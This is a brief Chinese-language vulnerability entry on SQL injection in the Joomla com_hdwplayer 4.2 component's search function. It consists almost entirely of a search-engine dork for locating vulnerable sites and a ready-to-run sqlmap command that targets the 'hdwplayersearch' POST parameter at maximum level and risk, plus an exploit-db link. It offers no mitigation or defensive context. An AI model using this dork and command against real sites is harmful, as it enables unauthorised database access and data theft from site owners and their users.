Joomla com\_hdwplayer 4.2 - \'search.php\' sql注入
==================================================

一、漏洞简介
------------

关键字:inurl:\"index.php?option=com\_hdwplayer\"

二、漏洞影响
------------

com\_hdwplayer 4.2

三、复现过程
------------

    python ./sqlmap.py -u "http://127.0.0.1/joomla/index.php" --method=POST --random-agent --data "option=com_hdwplayer&view=search&hdwplayersearch=xxx" --level=5 --risk=3 --dbms=mysql -p hdwplayersearch

参考链接
--------

> https://www.exploit-db.com/exploits/48242
